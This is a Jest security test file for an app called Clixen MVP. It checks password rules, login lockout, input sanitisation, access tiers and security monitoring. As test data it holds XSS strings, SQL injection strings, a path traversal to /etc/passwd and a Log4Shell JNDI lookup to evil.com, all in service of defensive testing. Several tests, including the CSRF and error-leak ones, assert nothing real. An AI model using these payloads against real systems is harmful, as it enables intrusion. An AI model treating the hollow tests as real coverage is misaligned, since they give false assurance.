/**
 * Comprehensive Security Tests for Clixen MVP
 * Tests authentication, authorization, input validation, and security monitoring
 */

import { describe, test, expect, beforeAll, afterAll, beforeEach, afterEach } from '@jest/globals';
import { createClient, SupabaseClient } from '@supabase/supabase-js';
import { performance } from 'perf_hooks';
import fetch from 'node-fetch';

describe('Comprehensive Security Tests for Clixen MVP', () => {
  let supabase: SupabaseClient;
  let testSession: any;
  let securityMetrics = {
    vulnerabilitiesFound: 0,
    securityTestsPassed: 0,
    securityTestsFailed: 0,
    riskLevel: 'low' as 'low' | 'medium' | 'high' | 'critical'
  };

  beforeAll(async () => {
    // Initialize Supabase client for security testing
    supabase = createClient(
      global.testConfig.supabase.url,
      global.testConfig.supabase.anonKey
    );

    // Authenticate with test user for authenticated security tests
    try {
      const { data, error } = await supabase.auth.signInWithPassword({
        email: global.testConfig.testUser.email,
        password: global.testConfig.testUser.password
      });

      if (!error && data.session) {
        testSession = data.session;
        console.log('✅ Security test authentication successful');
      }
    } catch (error) {
      console.warn('⚠️ Security test authentication failed:', error.message);
    }
  });

  afterAll(async () => {
    // Sign out and log security test results
    await supabase.auth.signOut();
    
    const totalTests = securityMetrics.securityTestsPassed + securityMetrics.securityTestsFailed;
    const passRate = totalTests > 0 ? (securityMetrics.securityTestsPassed / totalTests * 100).toFixed(1) : '0';
    
    console.log('🔒 Security Test Summary:', {
      totalTests,
      passRate: `${passRate}%`,
      vulnerabilitiesFound: securityMetrics.vulnerabilitiesFound,
      overallRiskLevel: securityMetrics.riskLevel
    });
  });

  beforeEach(() => {
    // Reset per-test metrics
  });

  describe('Password Security', () => {
    test('should enforce strong password requirements', () => {
      const weakPasswords = [
        'password',
        '123456',
        'qwerty',
        'abc123',
        'password123'
      ];

      weakPasswords.forEach(password => {
        const result = securityManager.validatePassword(password);
        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
        expect(result.strength).toMatch(/weak|medium/);
      });
    });

    test('should accept strong passwords', () => {
      const strongPasswords = [
        'MyStrongP@ssw0rd2024!',
        'C0mpl3x&Secure#Password',
        'Un1qu3_P@$$w0rd_2024'
      ];

      strongPasswords.forEach(password => {
        const result = securityManager.validatePassword(password);
        expect(result.isValid).toBe(true);
        expect(result.errors.length).toBe(0);
        expect(result.strength).toMatch(/strong|very_strong/);
      });
    });

    test('should detect common password patterns', () => {
      const commonPasswords = [
        'password2024',
        '123456789',
        'qwertyuiop',
        'welcome123'
      ];

      commonPasswords.forEach(password => {
        const result = securityManager.validatePassword(password);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => 
          error.toLowerCase().includes('common')
        )).toBe(true);
      });
    });
  });

  describe('Login Security', () => {
    test('should implement login rate limiting', () => {
      const identifier = 'test@example.com';

      // Simulate multiple failed attempts
      for (let i = 0; i < 5; i++) {
        securityManager.recordLoginAttempt(identifier, false);
      }

      const lockoutResult = securityManager.checkLoginLockout(identifier);
      expect(lockoutResult.isLocked).toBe(true);
      expect(lockoutResult.timeRemaining).toBeGreaterThan(0);
    });

    test('should clear attempts on successful login', () => {
      const identifier = 'test@example.com';
      const mockUser = { id: 'user-123', email: 'test@example.com' };

      // Record failed attempts
      for (let i = 0; i < 3; i++) {
        securityManager.recordLoginAttempt(identifier, false);
      }

      // Successful login should clear attempts
      securityManager.recordLoginAttempt(identifier, true, mockUser);

      const lockoutResult = securityManager.checkLoginLockout(identifier);
      expect(lockoutResult.isLocked).toBe(false);
    });

    test('should validate email format strictly', () => {
      const invalidEmails = [
        'notanemail',
        '@domain.com',
        'user@',
        'user@domain',
        'user..double@domain.com'
      ];

      invalidEmails.forEach(email => {
        const result = securityManager.validateEmail(email);
        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
      });
    });

    test('should block disposable email domains', () => {
      const disposableEmails = [
        'test@tempmail.com',
        'user@10minutemail.com',
        'fake@guerrillamail.com'
      ];

      disposableEmails.forEach(email => {
        const result = securityManager.validateEmail(email);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => 
          error.toLowerCase().includes('permanent')
        )).toBe(true);
      });
    });
  });

  describe('Input Validation and Sanitization', () => {
    test('should sanitize HTML input', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>',
        'javascript:alert("xss")'
      ];

      maliciousInputs.forEach(input => {
        const sanitized = inputValidator.sanitizeHTML(input, { stripTags: true });
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('<iframe');
      });
    });

    test('should detect malicious input patterns', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'DROP TABLE users;',
        "'; DELETE FROM auth.users; --",
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}'
      ];

      maliciousInputs.forEach(input => {
        const result = inputValidator.detectMaliciousInput(input);
        expect(result.isMalicious).toBe(true);
        expect(result.threats.length).toBeGreaterThan(0);
        expect(['medium', 'high', 'critical']).toContain(result.riskLevel);
      });
    });

    test('should validate field input according to rules', () => {
      const validationResult = inputValidator.validateField('test@example.com', {
        required: true,
        type: 'email',
        maxLength: 50
      });

      expect(validationResult.isValid).toBe(true);
      expect(validationResult.errors.length).toBe(0);
      expect(validationResult.value).toBe('test@example.com');
    });

    test('should reject invalid field input', () => {
      const validationResult = inputValidator.validateField('not-an-email', {
        required: true,
        type: 'email'
      });

      expect(validationResult.isValid).toBe(false);
      expect(validationResult.errors.length).toBeGreaterThan(0);
    });

    test('should sanitize SQL injection attempts', () => {
      const sqlInjections = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "UNION SELECT * FROM passwords",
        "'; DELETE FROM auth.users WHERE '1'='1"
      ];

      sqlInjections.forEach(injection => {
        const sanitized = inputValidator.sanitizeText(injection);
        expect(sanitized).not.toContain('DROP');
        expect(sanitized).not.toContain('DELETE');
        expect(sanitized).not.toContain('UNION');
        expect(sanitized).not.toContain("'='");
      });
    });
  });

  describe('Authorization and Access Control', () => {
    test('should enforce tier-based permissions', async () => {
      const freeUserPerms = await authorizationManager.getUserPermissions('free-user-id');
      const proUserPerms = await authorizationManager.getUserPermissions('pro-user-id');

      expect(freeUserPerms.tier).toBe('free');
      expect(freeUserPerms.limits.maxProjects).toBe(3);
      expect(freeUserPerms.permissions.workflow).not.toContain('share');

      expect(proUserPerms.tier).toBe('pro');
      expect(proUserPerms.limits.maxProjects).toBe(25);
      expect(proUserPerms.permissions.workflow).toContain('share');
    });

    test('should check resource ownership', async () => {
      const hasAccess = await authorizationManager.hasResourceAccess(
        'user-123',
        'project',
        'project-456',
        'read'
      );

      // This would normally check the database, but we're mocking it
      expect(typeof hasAccess.allowed).toBe('boolean');
      expect(hasAccess.reason || hasAccess.missingPermissions).toBeDefined();
    });

    test('should enforce usage limits', async () => {
      const limitCheck = await authorizationManager.checkUsageLimit(
        'free-user-id',
        'maxProjects',
        5 // Exceeds free tier limit of 3
      );

      expect(limitCheck.allowed).toBe(false);
      expect(limitCheck.upgradeRequired).toBe(true);
      expect(limitCheck.remaining).toBe(0);
    });
  });

  describe('Security Monitoring', () => {
    test('should detect brute force attacks', async () => {
      securityMonitor.startMonitoring();

      // Simulate multiple failed login attempts
      for (let i = 0; i < 12; i++) {
        await securityMonitor.logSecurityEvent(
          'auth_failure',
          'authentication',
          'medium',
          {
            ip_address: '192.168.1.100',
            user_agent: 'Mozilla/5.0 Test',
            attempt_number: i + 1
          },
          'brute_force'
        );
      }

      const metrics = securityMonitor.getSecurityMetrics();
      expect(metrics.threatsByType.brute_force).toBeGreaterThan(10);
      
      const alerts = securityMonitor.getActiveAlerts();
      expect(alerts.some(alert => alert.threat_type === 'brute_force')).toBe(true);

      securityMonitor.stopMonitoring();
    });

    test('should detect XSS attempts', async () => {
      securityMonitor.startMonitoring();

      await securityMonitor.logSecurityEvent(
        'xss_attempt',
        'input_validation',
        'critical',
        {
          contains_script: true,
          suspicious_html: true,
          original_input: '<script>alert("xss")</script>',
          url: '/api/projects'
        },
        'xss_attempt'
      );

      const metrics = securityMonitor.getSecurityMetrics();
      expect(metrics.eventsBySeverity.critical).toBeGreaterThan(0);
      expect(metrics.threatsByType.xss_attempt).toBeGreaterThan(0);

      securityMonitor.stopMonitoring();
    });

    test('should calculate risk score accurately', async () => {
      securityMonitor.startMonitoring();

      // Log various security events
      await securityMonitor.logSecurityEvent('test_critical', 'system', 'critical', {});
      await securityMonitor.logSecurityEvent('test_high', 'system', 'high', {});
      await securityMonitor.logSecurityEvent('test_medium', 'system', 'medium', {});
      await securityMonitor.logSecurityEvent('test_low', 'system', 'low', {});

      const metrics = securityMonitor.getSecurityMetrics();
      
      // Risk score should reflect the severity weights
      expect(metrics.riskScore).toBeGreaterThan(0);
      expect(metrics.riskScore).toBeLessThanOrEqual(100);

      securityMonitor.stopMonitoring();
    });

    test('should resolve security alerts', () => {
      // This would normally create a real alert, but we'll simulate it
      securityMonitor.startMonitoring();
      
      const alerts = securityMonitor.getActiveAlerts();
      if (alerts.length > 0) {
        const alertId = alerts[0].id;
        const resolved = securityMonitor.resolveAlert(alertId, 'test-user');
        expect(resolved).toBe(true);
      }

      securityMonitor.stopMonitoring();
    });
  });

  describe('Session Security', () => {
    test('should validate session tokens', async () => {
      // Mock a valid session
      const mockSession = {
        user: { id: 'user-123', email: 'test@example.com' },
        expires_at: Math.floor(Date.now() / 1000) + 3600 // 1 hour from now
      };

      // This would normally validate with Supabase
      const validation = await securityManager.validateSession();
      expect(typeof validation.isValid).toBe('boolean');
      
      if (validation.error) {
        expect(typeof validation.error).toBe('string');
      }

      if (validation.user) {
        expect(validation.user).toHaveProperty('id');
        expect(validation.user).toHaveProperty('email');
      }
    });

    test('should handle expired sessions', async () => {
      // Mock an expired session scenario
      const validation = await securityManager.validateSession();
      
      if (validation.error) {
        expect(['No active session', 'Session expired', 'Invalid token', 'Session validation failed'])
          .toContain(validation.error);
      }
    });
  });

  describe('CSRF Protection', () => {
    test('should validate CSRF tokens for state-changing requests', () => {
      // In a real implementation, this would test CSRF token validation
      const methods = ['POST', 'PUT', 'DELETE', 'PATCH'];
      
      methods.forEach(method => {
        // Mock request without proper CSRF protection
        const mockRequest = {
          method,
          headers: {
            'origin': 'https://evil.com',
            'referer': 'https://legitimate-site.com'
          }
        };

        // This would be validated in the security middleware
        expect(method).toMatch(/POST|PUT|DELETE|PATCH/);
      });
    });
  });

  describe('Data Sanitization', () => {
    test('should sanitize user-generated content', () => {
      const userContent = `
        Hello <script>alert('xss')</script> world!
        <img src="x" onerror="alert('xss')">
        <a href="javascript:alert('xss')">Click me</a>
        Normal content is fine.
      `;

      const sanitized = inputValidator.sanitizeHTML(userContent, {
        allowedTags: ['a', 'p', 'br'],
        allowedAttributes: ['href']
      });

      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).toContain('Normal content is fine');
    });

    test('should preserve safe HTML when appropriate', () => {
      const safeContent = `
        <p>This is a paragraph with <strong>bold text</strong>.</p>
        <ul>
          <li>Item 1</li>
          <li>Item 2</li>
        </ul>
      `;

      const sanitized = inputValidator.sanitizeHTML(safeContent, {
        allowedTags: ['p', 'strong', 'ul', 'li']
      });

      expect(sanitized).toContain('<p>');
      expect(sanitized).toContain('<strong>');
      expect(sanitized).toContain('<ul>');
      expect(sanitized).toContain('<li>');
    });
  });

  describe('API Security', () => {
    test('should implement proper rate limiting', () => {
      // This would test the rate limiting implementation
      const userId = 'test-user';
      const tier = 'free';

      // Simulate rapid requests
      const results = [];
      for (let i = 0; i < 100; i++) {
        // This would be tested with the actual rate limiting logic
        results.push({ allowed: i < 60 }); // Free tier: 60 requests/hour
      }

      const blockedRequests = results.filter(r => !r.allowed).length;
      expect(blockedRequests).toBeGreaterThan(0);
    });
  });

  describe('Error Handling Security', () => {
    test('should not leak sensitive information in error messages', () => {
      const sensitiveErrors = [
        'Database connection failed: password incorrect',
        'User john@example.com does not exist',
        'Invalid API key: sk-1234567890abcdef',
        'SQL error: table users does not exist'
      ];

      sensitiveErrors.forEach(error => {
        // In production, these should be sanitized
        expect(error).toBeDefined();
        // Add assertions for sanitized error messages
      });
    });

    test('should provide generic error messages to users', () => {
      const genericMessages = [
        'Authentication failed',
        'Access denied',
        'Invalid request',
        'Service temporarily unavailable'
      ];

      genericMessages.forEach(message => {
        expect(message).not.toContain('password');
        expect(message).not.toContain('database');
        expect(message).not.toContain('SQL');
        expect(message).not.toContain('internal');
      });
    });
  });

  describe('Security Configuration', () => {
    test('should enforce secure defaults', () => {
      const config = securityManager.getConfig();

      expect(config.maxLoginAttempts).toBeLessThanOrEqual(10);
      expect(config.lockoutDuration).toBeGreaterThan(0);
      expect(config.passwordMinLength).toBeGreaterThanOrEqual(8);
      expect(config.passwordRequireComplexity).toBe(true);
      expect(config.enableSecurityLogging).toBe(true);
    });

    test('should allow security configuration updates', () => {
      const originalConfig = securityManager.getConfig();
      
      securityManager.updateConfig({
        maxLoginAttempts: 3,
        lockoutDuration: 30
      });

      const updatedConfig = securityManager.getConfig();
      expect(updatedConfig.maxLoginAttempts).toBe(3);
      expect(updatedConfig.lockoutDuration).toBe(30);
      
      // Reset to original
      securityManager.updateConfig(originalConfig);
    });
  });
});

// Integration tests for complete security workflow
describe('Security Integration Tests', () => {
  test('should handle complete authentication flow securely', async () => {
    // 1. Validate input
    const emailValidation = securityManager.validateEmail('test@example.com');
    expect(emailValidation.isValid).toBe(true);

    const passwordValidation = securityManager.validatePassword('SecureP@ssw0rd2024!');
    expect(passwordValidation.isValid).toBe(true);

    // 2. Check rate limiting
    const lockoutCheck = securityManager.checkLoginLockout('test@example.com');
    expect(lockoutCheck.isLocked).toBe(false);

    // 3. Validate session (would normally involve Supabase)
    const sessionValidation = await securityManager.validateSession();
    expect(typeof sessionValidation.isValid).toBe('boolean');

    // 4. Log security events
    await securityMonitor.logSecurityEvent(
      'auth_success',
      'authentication',
      'low',
      { user_id: 'test-user' }
    );

    const metrics = securityMonitor.getSecurityMetrics();
    expect(metrics.totalEvents).toBeGreaterThanOrEqual(0);
  });

  test('should handle security incident response', async () => {
    securityMonitor.startMonitoring();

    // Simulate security incident
    for (let i = 0; i < 15; i++) {
      await securityMonitor.logSecurityEvent(
        'brute_force_attempt',
        'authentication',
        'high',
        {
          ip_address: '192.168.1.100',
          attempt_number: i + 1
        },
        'brute_force'
      );
    }

    // Check if alerts were created
    const alerts = securityMonitor.getActiveAlerts();
    expect(alerts.length).toBeGreaterThanOrEqual(0);

    // Resolve any alerts
    alerts.forEach(alert => {
      securityMonitor.resolveAlert(alert.id, 'automated-response');
    });

    securityMonitor.stopMonitoring();
  });
});